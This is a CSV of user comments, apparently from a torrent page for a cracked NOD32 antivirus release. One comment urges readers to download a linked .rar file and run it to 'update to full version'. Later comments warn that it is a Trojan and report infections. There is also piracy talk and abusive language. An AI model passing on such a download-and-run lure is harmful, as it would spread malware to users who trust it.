User Type,Username,Date,Text
,sukki,2007-01-29T23:24Z,"u need to download and run this to update to full version. 
http://ulisessoft.esfree.net/redirect.php?software/nodlogin.rar&comprobar

put it in your install folder and run"
,Simon_nr22,2007-01-30T16:12Z,good torrent everything work!
,PappyG,2007-02-10T11:21Z,The first thing you will get if you connect to Sukki's site is a Trojan. Keep well away from it. My current version of Nod32 picked it up straight away.
,Lawii^,2007-02-13T10:39Z,The fucking crack dont work
,NinjaManiac1515,2007-03-04T19:45Z,"thx alot..looks trustworthy..im gonna try it out....
message here if problems arise with the program"
,charee,2007-03-04T20:34Z,thx man works g8 :)
,charee,2007-03-04T20:34Z,thx man works gr8 :)
,devil_66,2007-04-17T00:50Z,"i installed this version of nod and the first thing i got was viruses. And loads of them. Now im stuck with 904GB's om data and scattered files all over the drives. thaks alot asshole!

i want you to ban this motherfucker. uploading freaking viruses on TPB isent nice at all!

Ban ban ban. You hear the rythmen? Ban ban"
,PathOfDestruction,2008-02-22T21:18Z,l채gg upp slaskfittorna igen
,bagrovar,2008-11-02T09:23Z,good
